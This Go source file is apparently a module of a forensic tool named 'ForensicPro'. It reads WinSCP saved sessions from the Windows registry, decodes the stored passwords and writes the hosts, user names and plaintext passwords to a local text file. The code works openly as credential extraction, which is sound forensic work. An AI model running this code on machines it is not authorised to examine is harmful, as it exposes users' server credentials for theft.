package FTPS

import (
	"ForensicPro/utils"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"log"
	"os"
	"path/filepath"
	"strings"
)

var WinSCPName = "WinSCP"

const PW_MAGIC = 163
const PW_FLAG = 'ÿ'

type Flags struct {
	flag          byte
	remainingPass string
}

func GetInfo() string {
	var stringBuilder strings.Builder
	name := `Software\Martin Prikryl\WinSCP 2\Sessions`
	registryKey, err := registry.OpenKey(registry.CURRENT_USER, name, registry.QUERY_VALUE)
	if err != nil {
		return ""
	}
	defer registryKey.Close()

	subKeyNames, err := registryKey.ReadSubKeyNames(-1)
	if err != nil {
		return ""
	}

	for _, name2 := range subKeyNames {
		registryKey2, err := registry.OpenKey(registry.CURRENT_USER, name+"\\"+name2, registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		defer registryKey2.Close()

		hostName, _, err := registryKey2.GetStringValue("HostName")
		if err != nil || hostName == "" {
			continue
		}

		userName, _, _ := registryKey2.GetStringValue("UserName")
		password, _, _ := registryKey2.GetStringValue("Password")

		if hostName != "" && userName != "" && password != "" {
			stringBuilder.WriteString("hostname: " + hostName + "\n")
			stringBuilder.WriteString("username: " + userName + "\n")
			stringBuilder.WriteString("rawpass: " + password + "\n")
			decryptedPassword := DecryptWinSCPPassword(hostName, userName, password)
			stringBuilder.WriteString("password: " + decryptedPassword + "\n")
		}
	}

	return stringBuilder.String()
}
func DecryptNextCharacterWinSCP(passwd string) Flags {
	num := strings.Index("0123456789ABCDEF", string(passwd[0])) * 16
	num2 := strings.Index("0123456789ABCDEF", string(passwd[1]))
	num3 := num + num2

	var result Flags
	result.flag = byte((^(num3^PW_MAGIC)%256 + 256) % 256)
	result.remainingPass = passwd[2:]

	return result
}
func DecryptWinSCPPassword(Host string, userName string, passWord string) string {
	var text string
	text2 := userName + Host

	flags := DecryptNextCharacterWinSCP(passWord)
	flag := flags.flag
	var flag2 byte

	if flag == PW_FLAG {
		flags = DecryptNextCharacterWinSCP(DecryptNextCharacterWinSCP(flags.remainingPass).remainingPass)
		flag2 = flags.flag
	} else {
		flag2 = flags.flag
	}

	flags = DecryptNextCharacterWinSCP(flags.remainingPass)
	flags.remainingPass = flags.remainingPass[flags.flag*2:]

	for i := 0; i < int(flag2); i++ {
		flags = DecryptNextCharacterWinSCP(flags.remainingPass)
		text += string(flags.flag)
	}

	if flag == PW_FLAG {
		if len(text) >= len(text2) && text[:len(text2)] == text2 {
			text = text[len(text2):]
		} else {
			text = ""
		}
	}

	return text
}

func WinSCPSave(path string) {
	content := GetInfo()
	if content != "" {
		targetPath := filepath.Join(path, WinSCPName)
		if err := os.MkdirAll(targetPath, os.ModePerm); err != nil {
			log.Fatalf("创建目录失败: %v", err)
		}

		utils.WriteToFile(content, targetPath+"\\"+WinSCPName+".txt")

	}
	fmt.Println(WinSCPName + " 取证结束")

}
